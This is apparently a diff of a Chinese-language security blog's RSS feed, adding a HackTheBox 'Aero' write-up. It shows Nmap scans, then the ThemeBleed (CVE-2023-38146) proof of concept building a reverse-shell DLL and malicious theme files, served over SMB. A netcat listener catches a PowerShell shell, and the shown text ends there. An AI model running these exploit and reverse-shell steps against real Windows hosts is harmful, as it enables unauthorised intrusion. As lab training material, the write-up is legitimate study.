@@ -1,4 +1,387 @@
-<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>Posts on Welcome My Hack's Blog</title><link>https://enilmalus.github.io/posts/</link><description>Recent content in Posts on Welcome My Hack's Blog</description><generator>Hugo -- gohugo.io</generator><language>en-us</language><lastBuildDate>Tue, 22 Sep 2026 15:00:00 +0800</lastBuildDate><atom:link href="https://enilmalus.github.io/posts/index.xml" rel="self" type="application/rss+xml"/><item><title>HTB-Hathor Writeup</title><link>https://enilmalus.github.io/posts/htb-hathor-writeup/</link><pubDate>Tue, 22 Sep 2026 15:00:00 +0800</pubDate><guid>https://enilmalus.github.io/posts/htb-hathor-writeup/</guid><description>Nmap 扫描 使用 Nmap 扫描端口。
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>Posts on Welcome My Hack's Blog</title><link>https://enilmalus.github.io/posts/</link><description>Recent content in Posts on Welcome My Hack's Blog</description><generator>Hugo -- gohugo.io</generator><language>en-us</language><lastBuildDate>Mon, 28 Sep 2026 14:00:00 +0800</lastBuildDate><atom:link href="https://enilmalus.github.io/posts/index.xml" rel="self" type="application/rss+xml"/><item><title>HTB-Aero Writeup</title><link>https://enilmalus.github.io/posts/htb-aero-writeup/</link><pubDate>Mon, 28 Sep 2026 14:00:00 +0800</pubDate><guid>https://enilmalus.github.io/posts/htb-aero-writeup/</guid><description>Nmap 探索 使用 Nmap 对目标进行全端口扫描，只发现 80 端口开放。
+┌──(kali㉿kali)-[~/Work/Kali/Aero] └─$ sudo nmap --min-rate 10000 -p- 10.129.229.128 -oA Nmap/ports [sudo] password for kali: Starting Nmap 7.98 ( https://nmap.org ) at 2026-09-27 22:20 -0400 Nmap scan report for 10.129.229.128 Host is up (0.13s latency). Not shown: 65534 filtered tcp ports (no-response) PORT STATE SERVICE 80/tcp open http Nmap done: 1 IP address (1 host up) scanned in 14.27 seconds ┌──(kali㉿kali)-[~/Work/Kali/Aero] └─$ sudo nmap --min-rate 10000 -sN -p- 10.</description><content type="html"><![CDATA[<h2 id="nmap-探索">Nmap 探索</h2>
+<p>使用 Nmap 对目标进行全端口扫描，只发现 80 端口开放。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Work/Kali/Aero<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ sudo nmap --min-rate <span style="color:#ae81ff">10000</span> -p- 10.129.229.128 -oA Nmap/ports
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>sudo<span style="color:#f92672">]</span> password <span style="color:#66d9ef">for</span> kali:
+</span></span><span style="display:flex;"><span>Starting Nmap 7.98 <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2026-09-27 22:20 -0400
+</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#66d9ef">for</span> 10.129.229.128
+</span></span><span style="display:flex;"><span>Host is up <span style="color:#f92672">(</span>0.13s latency<span style="color:#f92672">)</span>.
+</span></span><span style="display:flex;"><span>Not shown: <span style="color:#ae81ff">65534</span> filtered tcp ports <span style="color:#f92672">(</span>no-response<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>PORT   STATE SERVICE
+</span></span><span style="display:flex;"><span>80/tcp open  http
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">1</span> IP address <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> host up<span style="color:#f92672">)</span> scanned in 14.27 seconds
+</span></span><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Work/Kali/Aero<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ sudo nmap --min-rate <span style="color:#ae81ff">10000</span> -sN -p- 10.129.229.128 -oA Nmap/ports
+</span></span><span style="display:flex;"><span>Starting Nmap 7.98 <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2026-09-27 22:21 -0400
+</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#66d9ef">for</span> 10.129.229.128
+</span></span><span style="display:flex;"><span>Host is up <span style="color:#f92672">(</span>0.12s latency<span style="color:#f92672">)</span>.
+</span></span><span style="display:flex;"><span>All <span style="color:#ae81ff">65535</span> scanned ports on 10.129.229.128 are in ignored states.
+</span></span><span style="display:flex;"><span>Not shown: <span style="color:#ae81ff">65535</span> open|filtered tcp ports <span style="color:#f92672">(</span>no-response<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">1</span> IP address <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> host up<span style="color:#f92672">)</span> scanned in 14.71 seconds
+</span></span></code></pre></div><p>对 80 端口做系统与版本指纹探测，初步判断是 Windows 主机。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Work/Kali/Aero<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ sudo nmap -sT -O -p <span style="color:#ae81ff">80</span> 10.129.229.128
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>sudo<span style="color:#f92672">]</span> password <span style="color:#66d9ef">for</span> kali:
+</span></span><span style="display:flex;"><span>Starting Nmap 7.98 <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2026-09-27 22:22 -0400
+</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#66d9ef">for</span> 10.129.229.128
+</span></span><span style="display:flex;"><span>Host is up <span style="color:#f92672">(</span>0.12s latency<span style="color:#f92672">)</span>.
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>PORT   STATE SERVICE
+</span></span><span style="display:flex;"><span>80/tcp open  http
+</span></span><span style="display:flex;"><span>Warning: OSScan results may be unreliable because we could not find at least <span style="color:#ae81ff">1</span> open and <span style="color:#ae81ff">1</span> closed port
+</span></span><span style="display:flex;"><span>Device type: general purpose
+</span></span><span style="display:flex;"><span>Running <span style="color:#f92672">(</span>JUST GUESSING<span style="color:#f92672">)</span>: Microsoft Windows 11|2008|<span style="color:#ae81ff">7</span> <span style="color:#f92672">(</span>89%<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>OS CPE: cpe:/o:microsoft:windows_11 cpe:/o:microsoft:windows_server_2008:r2 cpe:/o:microsoft:windows_7
+</span></span><span style="display:flex;"><span>Aggressive OS guesses: Microsoft Windows <span style="color:#ae81ff">11</span> 21H2 <span style="color:#f92672">(</span>89%<span style="color:#f92672">)</span>, Microsoft Windows <span style="color:#ae81ff">7</span> or Windows Server <span style="color:#ae81ff">2008</span> R2 <span style="color:#f92672">(</span>85%<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>No exact OS matches <span style="color:#66d9ef">for</span> host <span style="color:#f92672">(</span>test conditions non-ideal<span style="color:#f92672">)</span>.
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>OS detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+</span></span><span style="display:flex;"><span>Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">1</span> IP address <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> host up<span style="color:#f92672">)</span> scanned in 5.08 seconds
+</span></span></code></pre></div><p>访问首页，站点是一个 Windows 11 主题仓库，页面底部提供主题文件上传功能（只接受 .theme 与 .themepack）。</p>
+<p><img src="Pasted%20image%2020260928112651.png" alt=""></p>
+<h2 id="themebleed-漏洞利用cve-2023-38146">ThemeBleed 漏洞利用（CVE-2023-38146）</h2>
+<p>站点是 Windows 11 主题仓库，结合 2023 年公开的 Windows 主题 RCE 漏洞 ThemeBleed，克隆对应的 PoC 仓库。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Work/Kali/Aero<span style="color:#f92672">]</span>                                                                                                                                      
+</span></span><span style="display:flex;"><span>└─$ git clone -q --depth <span style="color:#ae81ff">1</span> https://github.com/Jnnshschl/CVE-2023-38146.git themebleed                                                                                   
+</span></span><span style="display:flex;"><span> 
+</span></span></code></pre></div><p>创建虚拟环境并安装依赖。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Work/Kali/Aero/themebleed<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ python3 -m venv ve                                                   
+</span></span><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Work/Kali/Aero/themebleed<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ source ve/bin/activate
+</span></span><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>ve<span style="color:#f92672">)</span>─<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Work/Kali/Aero/themebleed<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ pip install -r requirements.txt
+</span></span><span style="display:flex;"><span>Collecting cabarchive <span style="color:#f92672">(</span>from -r requirements.txt <span style="color:#f92672">(</span>line 1<span style="color:#f92672">))</span>
+</span></span><span style="display:flex;"><span>  Using cached cabarchive-0.2.5-py3-none-any.whl.metadata <span style="color:#f92672">(</span><span style="color:#ae81ff">933</span> bytes<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>Collecting impacket <span style="color:#f92672">(</span>from -r requirements.txt <span style="color:#f92672">(</span>line 2<span style="color:#f92672">))</span>
+</span></span><span style="display:flex;"><span>  Using cached impacket-0.13.1-py3-none-any.whl.metadata <span style="color:#f92672">(</span>6.0 kB<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>Collecting pyasn1&gt;<span style="color:#f92672">=</span>0.2.3 <span style="color:#f92672">(</span>from impacket-&gt;-r requirements.txt <span style="color:#f92672">(</span>line 2<span style="color:#f92672">))</span>
+</span></span><span style="display:flex;"><span>  Using cached pyasn1-0.6.4-py3-none-any.whl.metadata <span style="color:#f92672">(</span>8.4 kB<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>Collecting pyasn1_modules <span style="color:#f92672">(</span>from impacket-&gt;-r requirements.txt <span style="color:#f92672">(</span>line 2<span style="color:#f92672">))</span>
+</span></span><span style="display:flex;"><span>  Using cached pyasn1_modules-0.4.2-py3-none-any.whl.metadata <span style="color:#f92672">(</span>3.5 kB<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>Collecting pycryptodomex <span style="color:#f92672">(</span>from impacket-&gt;-r requirements.txt <span style="color:#f92672">(</span>line 2<span style="color:#f92672">))</span>
+</span></span><span style="display:flex;"><span>  Using cached pycryptodomex-3.23.0-cp37-abi3-manylinux_2_17_x86_64.manylinux2014_x86_64.whl.metadata <span style="color:#f92672">(</span>3.4 kB<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>Collecting pyOpenSSL <span style="color:#f92672">(</span>from impacket-&gt;-r requirements.txt <span style="color:#f92672">(</span>line 2<span style="color:#f92672">))</span>
+</span></span><span style="display:flex;"><span>  Using cached pyopenssl-26.4.0-py3-none-any.whl.metadata <span style="color:#f92672">(</span><span style="color:#ae81ff">22</span> kB<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>Collecting six <span style="color:#f92672">(</span>from impacket-&gt;-r requirements.txt <span style="color:#f92672">(</span>line 2<span style="color:#f92672">))</span>
+</span></span><span style="display:flex;"><span>  Using cached six-1.17.0-py2.py3-none-any.whl.metadata <span style="color:#f92672">(</span>1.7 kB<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>Collecting ldap3!<span style="color:#f92672">=</span>2.5.0,!<span style="color:#f92672">=</span>2.5.2,!<span style="color:#f92672">=</span>2.6,&gt;<span style="color:#f92672">=</span>2.5 <span style="color:#f92672">(</span>from impacket-&gt;-r requirements.txt <span style="color:#f92672">(</span>line 2<span style="color:#f92672">))</span>
+</span></span><span style="display:flex;"><span>  Using cached ldap3-2.9.1-py2.py3-none-any.whl.metadata <span style="color:#f92672">(</span>5.4 kB<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>Collecting ldapdomaindump&gt;<span style="color:#f92672">=</span>0.9.0 <span style="color:#f92672">(</span>from impacket-&gt;-r requirements.txt <span style="color:#f92672">(</span>line 2<span style="color:#f92672">))</span>
+</span></span><span style="display:flex;"><span>  Using cached ldapdomaindump-0.10.0-py3-none-any.whl.metadata <span style="color:#f92672">(</span><span style="color:#ae81ff">512</span> bytes<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>Collecting flask&gt;<span style="color:#f92672">=</span>1.0 <span style="color:#f92672">(</span>from impacket-&gt;-r requirements.txt <span style="color:#f92672">(</span>line 2<span style="color:#f92672">))</span>
+</span></span><span style="display:flex;"><span>  Using cached flask-3.1.3-py3-none-any.whl.metadata <span style="color:#f92672">(</span>3.2 kB<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>Collecting charset_normalizer <span style="color:#f92672">(</span>from impacket-&gt;-r requirements.txt <span style="color:#f92672">(</span>line 2<span style="color:#f92672">))</span>
+</span></span><span style="display:flex;"><span>  Using cached charset_normalizer-3.5.1-cp313-cp313-manylinux2014_x86_64.manylinux_2_17_x86_64.manylinux_2_28_x86_64.whl.metadata <span style="color:#f92672">(</span><span style="color:#ae81ff">45</span> kB<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>Collecting blinker&gt;<span style="color:#f92672">=</span>1.9.0 <span style="color:#f92672">(</span>from flask&gt;<span style="color:#f92672">=</span>1.0-&gt;impacket-&gt;-r requirements.txt <span style="color:#f92672">(</span>line 2<span style="color:#f92672">))</span>
+</span></span><span style="display:flex;"><span>  Using cached blinker-1.9.0-py3-none-any.whl.metadata <span style="color:#f92672">(</span>1.6 kB<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>Collecting click&gt;<span style="color:#f92672">=</span>8.1.3 <span style="color:#f92672">(</span>from flask&gt;<span style="color:#f92672">=</span>1.0-&gt;impacket-&gt;-r requirements.txt <span style="color:#f92672">(</span>line 2<span style="color:#f92672">))</span>
+</span></span><span style="display:flex;"><span>  Using cached click-8.5.0-py3-none-any.whl.metadata <span style="color:#f92672">(</span>2.6 kB<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>Collecting itsdangerous&gt;<span style="color:#f92672">=</span>2.2.0 <span style="color:#f92672">(</span>from flask&gt;<span style="color:#f92672">=</span>1.0-&gt;impacket-&gt;-r requirements.txt <span style="color:#f92672">(</span>line 2<span style="color:#f92672">))</span>
+</span></span><span style="display:flex;"><span>  Using cached itsdangerous-2.2.0-py3-none-any.whl.metadata <span style="color:#f92672">(</span>1.9 kB<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>Collecting jinja2&gt;<span style="color:#f92672">=</span>3.1.2 <span style="color:#f92672">(</span>from flask&gt;<span style="color:#f92672">=</span>1.0-&gt;impacket-&gt;-r requirements.txt <span style="color:#f92672">(</span>line 2<span style="color:#f92672">))</span>
+</span></span><span style="display:flex;"><span>  Using cached jinja2-3.1.6-py3-none-any.whl.metadata <span style="color:#f92672">(</span>2.9 kB<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>Collecting markupsafe&gt;<span style="color:#f92672">=</span>2.1.1 <span style="color:#f92672">(</span>from flask&gt;<span style="color:#f92672">=</span>1.0-&gt;impacket-&gt;-r requirements.txt <span style="color:#f92672">(</span>line 2<span style="color:#f92672">))</span>
+</span></span><span style="display:flex;"><span>  Using cached markupsafe-3.0.3-cp313-cp313-manylinux2014_x86_64.manylinux_2_17_x86_64.manylinux_2_28_x86_64.whl.metadata <span style="color:#f92672">(</span>2.7 kB<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>Collecting werkzeug&gt;<span style="color:#f92672">=</span>3.1.0 <span style="color:#f92672">(</span>from flask&gt;<span style="color:#f92672">=</span>1.0-&gt;impacket-&gt;-r requirements.txt <span style="color:#f92672">(</span>line 2<span style="color:#f92672">))</span>
+</span></span><span style="display:flex;"><span>  Using cached werkzeug-3.1.9-py3-none-any.whl.metadata <span style="color:#f92672">(</span>4.1 kB<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>Collecting dnspython <span style="color:#f92672">(</span>from ldapdomaindump&gt;<span style="color:#f92672">=</span>0.9.0-&gt;impacket-&gt;-r requirements.txt <span style="color:#f92672">(</span>line 2<span style="color:#f92672">))</span>
+</span></span><span style="display:flex;"><span>  Using cached dnspython-2.8.0-py3-none-any.whl.metadata <span style="color:#f92672">(</span>5.7 kB<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>Collecting cryptography&lt;51,&gt;<span style="color:#f92672">=</span>49.0.0 <span style="color:#f92672">(</span>from pyOpenSSL-&gt;impacket-&gt;-r requirements.txt <span style="color:#f92672">(</span>line 2<span style="color:#f92672">))</span>
+</span></span><span style="display:flex;"><span>  Using cached cryptography-50.0.1-cp311-abi3-manylinux_2_34_x86_64.whl.metadata <span style="color:#f92672">(</span>4.3 kB<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>Collecting cffi&gt;<span style="color:#f92672">=</span>2.0.0 <span style="color:#f92672">(</span>from cryptography&lt;51,&gt;<span style="color:#f92672">=</span>49.0.0-&gt;pyOpenSSL-&gt;impacket-&gt;-r requirements.txt <span style="color:#f92672">(</span>line 2<span style="color:#f92672">))</span>
+</span></span><span style="display:flex;"><span>  Using cached cffi-2.1.1-cp313-cp313-manylinux2014_x86_64.manylinux_2_17_x86_64.whl.metadata <span style="color:#f92672">(</span>2.5 kB<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>Collecting pycparser <span style="color:#f92672">(</span>from cffi&gt;<span style="color:#f92672">=</span>2.0.0-&gt;cryptography&lt;51,&gt;<span style="color:#f92672">=</span>49.0.0-&gt;pyOpenSSL-&gt;impacket-&gt;-r requirements.txt <span style="color:#f92672">(</span>line 2<span style="color:#f92672">))</span>
+</span></span><span style="display:flex;"><span>  Using cached pycparser-3.0-py3-none-any.whl.metadata <span style="color:#f92672">(</span>8.2 kB<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>Using cached cabarchive-0.2.5-py3-none-any.whl <span style="color:#f92672">(</span><span style="color:#ae81ff">28</span> kB<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>Using cached impacket-0.13.1-py3-none-any.whl <span style="color:#f92672">(</span>1.8 MB<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>Using cached flask-3.1.3-py3-none-any.whl <span style="color:#f92672">(</span><span style="color:#ae81ff">103</span> kB<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>Using cached blinker-1.9.0-py3-none-any.whl <span style="color:#f92672">(</span>8.5 kB<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>Using cached click-8.5.0-py3-none-any.whl <span style="color:#f92672">(</span><span style="color:#ae81ff">125</span> kB<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>Using cached itsdangerous-2.2.0-py3-none-any.whl <span style="color:#f92672">(</span><span style="color:#ae81ff">16</span> kB<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>Using cached jinja2-3.1.6-py3-none-any.whl <span style="color:#f92672">(</span><span style="color:#ae81ff">134</span> kB<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>Using cached ldap3-2.9.1-py2.py3-none-any.whl <span style="color:#f92672">(</span><span style="color:#ae81ff">432</span> kB<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>Using cached ldapdomaindump-0.10.0-py3-none-any.whl <span style="color:#f92672">(</span><span style="color:#ae81ff">19</span> kB<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>Using cached markupsafe-3.0.3-cp313-cp313-manylinux2014_x86_64.manylinux_2_17_x86_64.manylinux_2_28_x86_64.whl <span style="color:#f92672">(</span><span style="color:#ae81ff">22</span> kB<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>Using cached pyasn1-0.6.4-py3-none-any.whl <span style="color:#f92672">(</span><span style="color:#ae81ff">84</span> kB<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>Using cached werkzeug-3.1.9-py3-none-any.whl <span style="color:#f92672">(</span><span style="color:#ae81ff">228</span> kB<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>Using cached charset_normalizer-3.5.1-cp313-cp313-manylinux2014_x86_64.manylinux_2_17_x86_64.manylinux_2_28_x86_64.whl <span style="color:#f92672">(</span><span style="color:#ae81ff">250</span> kB<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>Using cached dnspython-2.8.0-py3-none-any.whl <span style="color:#f92672">(</span><span style="color:#ae81ff">331</span> kB<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>Using cached pyasn1_modules-0.4.2-py3-none-any.whl <span style="color:#f92672">(</span><span style="color:#ae81ff">181</span> kB<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>Using cached pycryptodomex-3.23.0-cp37-abi3-manylinux_2_17_x86_64.manylinux2014_x86_64.whl <span style="color:#f92672">(</span>2.3 MB<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>Using cached pyopenssl-26.4.0-py3-none-any.whl <span style="color:#f92672">(</span><span style="color:#ae81ff">56</span> kB<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>Using cached cryptography-50.0.1-cp311-abi3-manylinux_2_34_x86_64.whl <span style="color:#f92672">(</span>4.7 MB<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>Using cached cffi-2.1.1-cp313-cp313-manylinux2014_x86_64.manylinux_2_17_x86_64.whl <span style="color:#f92672">(</span><span style="color:#ae81ff">221</span> kB<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>Using cached pycparser-3.0-py3-none-any.whl <span style="color:#f92672">(</span><span style="color:#ae81ff">48</span> kB<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>Using cached six-1.17.0-py2.py3-none-any.whl <span style="color:#f92672">(</span><span style="color:#ae81ff">11</span> kB<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>Installing collected packages: cabarchive, six, pycryptodomex, pycparser, pyasn1, markupsafe, itsdangerous, dnspython, click, charset_normalizer, blinker, werkzeug, pyasn1_modules, ldap3, jinja2, cffi, ldapdomaindump, flask, cryptography, pyOpenSSL, impacket
+</span></span><span style="display:flex;"><span>Successfully installed blinker-1.9.0 cabarchive-0.2.5 cffi-2.1.1 charset_normalizer-3.5.1 click-8.5.0 cryptography-50.0.1 dnspython-2.8.0 flask-3.1.3 impacket-0.13.1 itsdangerous-2.2.0 jinja2-3.1.6 ldap3-2.9.1 ldapdomaindump-0.10.0 markupsafe-3.0.3 pyOpenSSL-26.4.0 pyasn1-0.6.4 pyasn1_modules-0.4.2 pycparser-3.0 pycryptodomex-3.23.0 six-1.17.0 werkzeug-3.1.9
+</span></span></code></pre></div><p>启动 PoC，它会自动编译反弹 shell DLL、生成恶意主题文件，并在本机 445 端口启动 SMB 服务。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>ve<span style="color:#f92672">)</span>─<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Work/Kali/Aero/themebleed<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ sudo .venv/bin/python3 themebleed.py -r 10.10.16.151 -p <span style="color:#ae81ff">4711</span>
+</span></span><span style="display:flex;"><span>2026-09-27 23:30:21,501 INFO&gt; ThemeBleed CVE-2023-38146 PoC <span style="color:#f92672">[</span>https://github.com/Jnnshschl<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>2026-09-27 23:30:21,501 INFO&gt; Credits to -&gt; https://github.com/gabe-k/themebleed, impacket and cabarchive
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>2026-09-27 23:30:22,154 INFO&gt; Compiled DLL: <span style="color:#e6db74">&#34;./tb/Aero.msstyles_vrf_evil.dll&#34;</span>
+</span></span><span style="display:flex;"><span>2026-09-27 23:30:22,155 INFO&gt; Theme generated: <span style="color:#e6db74">&#34;evil_theme.theme&#34;</span>
+</span></span><span style="display:flex;"><span>2026-09-27 23:30:22,155 INFO&gt; Themepack generated: <span style="color:#e6db74">&#34;evil_theme.themepack&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>2026-09-27 23:30:22,155 INFO&gt; Remember to start netcat: rlwrap -cAr nc -lvnp <span style="color:#ae81ff">4711</span>
+</span></span><span style="display:flex;"><span>2026-09-27 23:30:22,155 INFO&gt; Starting SMB server: 10.10.16.151:445
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>2026-09-27 23:30:22,155 INFO&gt; Config file parsed
+</span></span><span style="display:flex;"><span>2026-09-27 23:30:22,155 DEBUG&gt; Callback added <span style="color:#66d9ef">for</span> UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
+</span></span><span style="display:flex;"><span>2026-09-27 23:30:22,155 DEBUG&gt; Callback added <span style="color:#66d9ef">for</span> UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
+</span></span><span style="display:flex;"><span>2026-09-27 23:30:22,155 INFO&gt; Config file parsed
+</span></span><span style="display:flex;"><span>2026-09-27 23:30:22,156 INFO&gt; Config file parsed
+</span></span></code></pre></div><p>确认恶意主题文件已经生成。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Work/Kali/Aero/themebleed<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ ls -liah evil_theme.theme*
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">4357117</span> -rw-r--r-- <span style="color:#ae81ff">1</span> root root <span style="color:#ae81ff">370</span> Sep <span style="color:#ae81ff">27</span> 23:30 evil_theme.theme
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">4357119</span> -rw-r--r-- <span style="color:#ae81ff">1</span> root root <span style="color:#ae81ff">455</span> Sep <span style="color:#ae81ff">27</span> 23:30 evil_theme.themepack
+</span></span></code></pre></div><p>开启监听，把主题文件上传到站点，靶机应用主题后回连成功，拿到 sam.emerson 的 shell。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Work/Kali/Aero<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ sudo rlwrap -cAr nc -lvnp <span style="color:#ae81ff">4711</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>sudo<span style="color:#f92672">]</span> password <span style="color:#66d9ef">for</span> kali: 
+</span></span><span style="display:flex;"><span>listening on <span style="color:#f92672">[</span>any<span style="color:#f92672">]</span> <span style="color:#ae81ff">4711</span> ...
+</span></span><span style="display:flex;"><span>id
+</span></span><span style="display:flex;"><span>connect to <span style="color:#f92672">[</span>10.10.16.151<span style="color:#f92672">]</span> from <span style="color:#f92672">(</span>UNKNOWN<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>10.129.229.128<span style="color:#f92672">]</span> <span style="color:#ae81ff">64725</span>
+</span></span><span style="display:flex;"><span>Windows PowerShell
+</span></span><span style="display:flex;"><span>Copyright <span style="color:#f92672">(</span>C<span style="color:#f92672">)</span> Microsoft Corporation. All rights reserved.
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Install the latest PowerShell <span style="color:#66d9ef">for</span> new features and improvements! https://aka.ms/PSWindows
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>PS C:<span style="color:#ae81ff">\W</span>indows<span style="color:#ae81ff">\s</span>ystem32&gt; id
+</span></span><span style="display:flex;"><span>id : The term <span style="color:#e6db74">&#39;id&#39;</span> is not recognized as the name of a cmdlet, <span style="color:#66d9ef">function</span>, script file, or operable program. Check the 
